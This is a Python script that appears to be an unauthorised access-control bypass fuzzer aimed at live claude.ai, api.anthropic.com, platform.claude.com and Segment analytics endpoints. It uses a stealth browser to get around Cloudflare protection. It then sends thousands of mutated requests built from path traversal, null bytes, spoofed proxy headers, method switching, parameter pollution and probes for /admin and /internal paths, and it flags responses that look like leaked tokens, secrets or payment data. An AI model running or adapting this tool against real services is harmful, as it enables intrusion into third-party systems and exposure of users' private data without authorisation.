#!/usr/bin/env python3
"""
anthropic-idor.py — IDOR fuzzer applying bypass techniques to Anthropic endpoints.
Uses CloakBrowser to bypass Cloudflare.

Techniques:
1.  %20 space bypass    6.  Sub-path variants      11. Object param pollution
2.  Trailing slash       7.  HTTP Parameter Pollution
3.  Double slash         8.  JSON array injection
4.  Dot tricks           9.  Bracket notation
5.  API version downgrade 10. Leading zeros / wildcards
"""
import asyncio
import re
import json
import time
from urllib.parse import urlencode

OUTPUT_DIR = "/tmp/anthropic-idor"
import os; os.makedirs(OUTPUT_DIR, exist_ok=True)

FINDINGS = []
ALL_RESULTS = []

# ---------------------------------------------------------------------------
# TARGET ENDPOINTS
# ---------------------------------------------------------------------------
TARGETS = [
    # claude.ai (CF-protected, needs CloakBrowser)
    {"name": "bootstrap", "host": "claude.ai", "method": "GET", "path": "/edge-api/bootstrap", "query": {}, "body": None},
    {"name": "account-profile", "host": "claude.ai", "method": "GET", "path": "/api/account_profile", "query": {}, "body": None},
    {"name": "banners", "host": "claude.ai", "method": "GET", "path": "/api/banners", "query": {}, "body": None},
    {"name": "organizations", "host": "claude.ai", "method": "GET", "path": "/api/organizations", "query": {}, "body": None},
    {"name": "org-discoverable", "host": "claude.ai", "method": "GET", "path": "/api/organizations/discoverable", "query": {}, "body": None},
    {"name": "billing-credits", "host": "claude.ai", "method": "GET", "path": "/api/billing/credits", "query": {}, "body": None},
    {"name": "billing-subscription", "host": "claude.ai", "method": "GET", "path": "/api/billing/subscription", "query": {}, "body": None},
    {"name": "referral", "host": "claude.ai", "method": "GET", "path": "/api/referral", "query": {}, "body": None},
    {"name": "team-trial", "host": "claude.ai", "method": "GET", "path": "/api/team-trial/exposure-eligible", "query": {}, "body": None},
    {"name": "migration", "host": "claude.ai", "method": "GET", "path": "/api/account/migration_eligibility", "query": {}, "body": None},
    {"name": "webauthn", "host": "claude.ai", "method": "GET", "path": "/api/auth/session_reattest/webauthn/challenge", "query": {}, "body": None},
    {"name": "login-methods", "host": "claude.ai", "method": "GET", "path": "/api/auth/login_methods", "query": {"email": "test@test.com", "source": "claude-ai"}, "body": None},
    {"name": "gift-validate", "host": "claude.ai", "method": "GET", "path": "/api/billing/gift/validate", "query": {"code": "TEST"}, "body": None},
    {"name": "gift-products", "host": "claude.ai", "method": "GET", "path": "/api/billing/gift/products", "query": {"currency": "USD"}, "body": None},
    {"name": "view-counts", "host": "claude.ai", "method": "GET", "path": "/api/published_artifacts/view_counts", "query": {"artifact_uuids": "00000000-0000-0000-0000-000000000000"}, "body": None},
    {"name": "referral-code", "host": "claude.ai", "method": "GET", "path": "/api/referral/code", "query": {}, "body": None, "suffix": "/TEST"},
    {"name": "event-logging", "host": "claude.ai", "method": "POST", "path": "/api/event_logging/v2/batch", "query": {}, "body": {"events": [{"event_type": "test", "event_data": {}}]}},
    {"name": "send-magic-link", "host": "claude.ai", "method": "POST", "path": "/api/auth/send_magic_link", "query": {}, "body": {"email_address": "test@test.com", "source": "claude", "utc_offset": 0}},
    {"name": "verify-code", "host": "claude.ai", "method": "POST", "path": "/api/auth/verify_code", "query": {}, "body": {"code": "000000", "email_address": "test@test.com"}},

    # api.anthropic.com (no CF, direct)
    {"name": "models", "host": "api.anthropic.com", "method": "GET", "path": "/v1/models", "query": {}, "body": None},
    {"name": "me", "host": "api.anthropic.com", "method": "GET", "path": "/v1/me", "query": {}, "body": None},
    {"name": "register", "host": "api.anthropic.com", "method": "POST", "path": "/register", "query": {}, "body": {"client_name": "test", "redirect_uris": ["http://localhost"]}},
    {"name": "token", "host": "api.anthropic.com", "method": "POST", "path": "/token", "query": {}, "body": {}},
    {"name": "authorize", "host": "api.anthropic.com", "method": "POST", "path": "/authorize", "query": {}, "body": {}},
    {"name": "revoke", "host": "api.anthropic.com", "method": "POST", "path": "/revoke", "query": {}, "body": {}},
    {"name": "oauth-metadata", "host": "api.anthropic.com", "method": "GET", "path": "/.well-known/oauth-authorization-server", "query": {}, "body": None},
    {"name": "v1-oauth-token", "host": "api.anthropic.com", "method": "POST", "path": "/v1/oauth/token", "query": {}, "body": {"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": "test", "federation_rule_id": "fdrl_test", "organization_id": "00000000-0000-0000-0000-000000000000"}},

    # a-api.anthropic.com (Segment, no CF)
    {"name": "segment-batch", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/batch", "query": {}, "body": {"batch": []}},
    {"name": "segment-identify", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/identify", "query": {}, "body": {}},
    {"name": "segment-track", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/track", "query": {}, "body": {"event": "test"}},
    {"name": "segment-import", "host": "a-api.anthropic.com", "method": "POST", "path": "/v1/import", "query": {}, "body": {}},

    # platform.claude.com (CF-protected)
    {"name": "platform-home", "host": "platform.claude.com", "method": "GET", "path": "/", "query": {}, "body": None},
    {"name": "platform-session", "host": "platform.claude.com", "method": "GET", "path": "/api/auth/session", "query": {}, "body": None},
]


# ---------------------------------------------------------------------------
# BYPASS TECHNIQUE GENERATOR
# ---------------------------------------------------------------------------
def generate_bypasses(target):
    """Generate all bypass variations for a target."""
    path = target["path"]
    query = target.get("query", {})
    body = target.get("body")
    suffix = target.get("suffix", "")
    full_path = path + suffix
    bypasses = []

    # 1. Trailing symbols
    for sym in [",", ";", ":", "|", "..", "...", "%00", "\\", "../", "..;/", "%0a", "%0d%0a", "?", "!", "@", "#", "$", "%", "^", "*", "(", ")", "[", "]", "{", "}", "<", ">", "~", "+", "-", "_", " ", "%20", "%09", "//"]:
        bypasses.append(("trailing-" + sym.replace("%", "pct").replace("\\", "bslash").replace("/", "fslash").replace(" ", "space")[:20], full_path + sym, query, body, None, None))

    # 2. Trailing slash
    if not full_path.endswith("/"):
        bypasses.append(("trailing-slash", full_path + "/", query, body, None, None))

    # 3. Double slash in path
    parts = full_path.split("/")
    for i in range(1, len(parts)):
        modified = parts[:i] + [""] + parts[i:]
        bypasses.append((f"double-slash-{i}", "/".join(modified), query, body, None, None))

    # 4. Dot tricks
    for i in range(2, len(parts)):
        modified = parts[:i] + [".", ""] + parts[i:]
        bypasses.append((f"dot-path-{i}", "/".join(modified), query, body, None, None))
    # Path traversal
    if len(parts) >= 4:
        modified = parts[:1] + [".."] + parts[2:]
        bypasses.append(("path-traversal", "/".join(modified), query, body, None, None))

    # 5. API version downgrade/upgrade
    v_match = re.match(r"^(/v)(\d+)(/.*)", full_path)
    if v_match:
        for v in range(1, 6):
            downgraded = f"{v_match.group(1)}{v}{v_match.group(3)}"
            if downgraded != full_path:
                bypasses.append((f"version-v{v}", downgraded, query, body, None, None))
    else:
        for v in range(1, 4):
            if full_path.startswith("/api/"):
                bypasses.append((f"version-prefix-v{v}", f"/api/v{v}{full_path[4:]}", query, body, None, None))

    # 6. Sub-path variants
    for sub in ["/details", "/info", "/status", "/metadata", "/data", "/config", "/admin", "/internal", "/debug", "/test", "/v1", "/v2", "/v3"]:
        bypasses.append((f"subpath-{sub.lstrip('/')}", full_path + sub, query, body, None, None))

    # 7. Query param pollution
    if query:
        for key in list(query.keys()):
            polluted = dict(query)
            polluted[key] = [query[key], "test"]
            bypasses.append((f"hpp-{key}-array", full_path, polluted, body, None, None))
            polluted2 = dict(query)
            polluted2[key.upper()] = "test"
            bypasses.append((f"hpp-{key}-case", full_path, polluted2, body, None, None))

    # 8. JSON array injection on body
    if body and isinstance(body, dict):
        for key in list(body.keys()):
            if isinstance(body[key], str):
                modified = dict(body)
                modified[key] = [body[key], "test"]
                bypasses.append((f"json-array-{key}", full_path, query, modified, None, None))
            elif isinstance(body[key], (int, float)):
                modified = dict(body)
                modified[key] = [body[key], 9]
                bypasses.append((f"json-array-int-{key}", full_path, query, modified, None, None))

    # 9. Common ID params
    for param_name in ["id", "user_id", "org_id", "organization_id", "email", "key", "token", "uuid", "code"]:
        bypasses.append((f"param-{param_name}", full_path, {**query, param_name: "test"}, body, None, None))

    # 10. Null byte
    bypasses.append(("null-byte", full_path + "%00", query, body, None, None))

    # 11. Method switching
    for alt in ["PUT", "PATCH", "DELETE", "OPTIONS", "HEAD"]:
        bypasses.append((f"method-{alt}", full_path, query, body, alt, None))

    # 12. Proxy headers
    for hdr_name, hdr_val in [("X-Original-URL", full_path), ("X-Forwarded-For", "127.0.0.1"), ("X-Forwarded-Host", "localhost"), ("X-Rewrite-URL", full_path)]:
        bypasses.append((f"proxy-{hdr_name}", full_path, query, body, None, {hdr_name: hdr_val}))

    # 13. Wildcards in query
    for key, val in query.items():
        if isinstance(val, str):
            bypasses.append((f"wildcard-{key}-pct", full_path, {**query, key: val + "%"}, body, None, None))
            bypasses.append((f"wildcard-{key}-star", full_path, {**query, key: val + "*"}, body, None, None))

    # 14. Brackets notation
    for key in list(query.keys()):
        bypasses.append((f"bracket-{key}", full_path, {f"{key}[]": query[key]}, body, None, None))
        bypasses.append((f"object-{key}", full_path, {f"{key}[user]": "test", f"{key}[admin]": "true"}, body, None, None))

    return bypasses


# ---------------------------------------------------------------------------
# MAIN
# ---------------------------------------------------------------------------
async def main():
    from cloakbrowser import launch_async

    browser = await launch_async(headless=True)
    context = await browser.new_context()
    page = await context.new_page()

    # Warmup: load claude.ai for CF cookies
    print("🌐 Loading claude.ai for Cloudflare cookies...")
    await page.goto("https://claude.ai", wait_until="networkidle", timeout=30000)
    await asyncio.sleep(3)

    total_findings = 0
    total_tests = 0

    for target in TARGETS:
        name = target["name"]
        host = target["host"]
        method = target["method"]
        path = target["path"]
        suffix = target.get("suffix", "")
        full_path = path + suffix

        print(f"\n{'='*60}")
        print(f"🎯 {name}: {method} {host}{full_path}")
        print(f"{'='*60}")

        # Generate bypasses
        bypasses = generate_bypasses(target)
        print(f"   Testing {len(bypasses)} bypass variations...")
        total_tests += len(bypasses)

        # Get baseline
        try:
            if target["body"]:
                baseline = await page.evaluate(f"""
                    async () => {{
                        try {{
                            const resp = await fetch('https://{host}{full_path}', {{
                                method: '{method}',
                                credentials: 'include',
                                headers: {{'Content-Type': 'application/json'}},
                                body: JSON.stringify({json.dumps(target["body"])})
                            }});
                            const text = await resp.text();
                            return {{status: resp.status, body: text.substring(0, 500)}};
                        }} catch(e) {{ return {{error: e.message}}; }}
                    }}
                """)
            else:
                baseline = await page.evaluate(f"""
                    async () => {{
                        try {{
                            const resp = await fetch('https://{host}{full_path}', {{
                                method: '{method}',
                                credentials: 'include'
                            }});
                            const text = await resp.text();
                            return {{status: resp.status, body: text.substring(0, 500)}};
                        }} catch(e) {{ return {{error: e.message}}; }}
                    }}
                """)
            print(f"   Baseline: {baseline.get('status', '?')} | {baseline.get('body', '')[:80]}")
        except:
            baseline = {"status": 0, "body": ""}

        # Test all bypasses
        for technique, bypass_path, bypass_query, bypass_body, bypass_method, bypass_headers in bypasses:
            method_to_use = bypass_method or method
            url = f"https://{host}{bypass_path}"
            if bypass_query:
                url += "?" + urlencode(bypass_query, doseq=True)

            try:
                body_json = json.dumps(bypass_body) if bypass_body else "null"
                has_body = bypass_body is not None

                header_js = ""
                if bypass_headers:
                    for hk, hv in bypass_headers.items():
                        header_js += f"'{hk}': '{hv}', "

                if has_body:
                    result = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const resp = await fetch('{url}', {{
                                    method: '{method_to_use}',
                                    credentials: 'include',
                                    headers: {{'Content-Type': 'application/json', {header_js}}},
                                    body: JSON.stringify({body_json})
                                }});
                                const text = await resp.text();
                                return {{status: resp.status, body: text.substring(0, 500)}};
                            }} catch(e) {{ return {{error: e.message}}; }}
                        }}
                    """)
                else:
                    result = await page.evaluate(f"""
                        async () => {{
                            try {{
                                const resp = await fetch('{url}', {{
                                    method: '{method_to_use}',
                                    credentials: 'include',
                                    headers: {{{header_js}}}
                                }});
                                const text = await resp.text();
                                return {{status: resp.status, body: text.substring(0, 500)}};
                            }} catch(e) {{ return {{error: e.message}}; }}
                        }}
                    """)

                status = result.get("status", 0)
                body = result.get("body", "")

                # Detect anomalies vs baseline
                b_status = baseline.get("status", 0)
                anomalies = []
                if status and status != b_status:
                    if b_status >= 400 and status < 400:
                        anomalies.append(f"BYPASS {b_status}→{status}")
                    elif status == 500:
                        anomalies.append(f"CRASH→500")
                    elif status == 405:
                        anomalies.append(f"EXISTS→405")
                    else:
                        anomalies.append(f"CHANGE {b_status}→{status}")

                # Data leak detection
                if body and len(body) > 50:
                    lower = body.lower()
                    for kw in ["token", "key", "secret", "password", "email", "user", "admin", "api_key", "session", "credential", "authorization", "bearer", "stripe", "payment"]:
                        if kw in lower and kw not in baseline.get("body", "").lower():
                            anomalies.append(f"DATA:{kw}")

                if anomalies:
                    icon = "🔥" if any("BYPASS" in a or "DATA" in a for a in anomalies) else "⚠️"
                    print(f"   {icon} {technique:35s} → {status} | {'; '.join(anomalies)}")
                    if body and len(body) > 10:
                        print(f"      Body: {body[:120]}")
                    FINDINGS.append({
                        "target": name, "technique": technique, "url": url,
                        "method": method_to_use, "status": status,
                        "body": body[:300], "anomalies": anomalies
                    })
                    total_findings += 1

                ALL_RESULTS.append({"target": name, "technique": technique, "url": url, "status": status, "body": body[:200]})

            except Exception as e:
                pass

            await asyncio.sleep(0.2)

        print(f"   Done: {len(bypasses)} tests")

    # Summary
    print(f"\n{'='*60}")
    print(f"📊 TOTAL: {total_findings} anomalies out of {total_tests} tests")
    print(f"{'='*60}")

    for f in FINDINGS:
        print(f"   🔥 [{f['target']}] {f['technique']:30s} → {f['status']} | {'; '.join(f['anomalies'][:2])}")

    with open(f"{OUTPUT_DIR}/findings.json", "w") as fp:
        json.dump(FINDINGS, fp, indent=2)
    with open(f"{OUTPUT_DIR}/all-results.json", "w") as fp:
        json.dump(ALL_RESULTS, fp, indent=2)

    print(f"\n💾 Saved to {OUTPUT_DIR}/")
    await browser.close()

if __name__ == "__main__":
    asyncio.run(main())
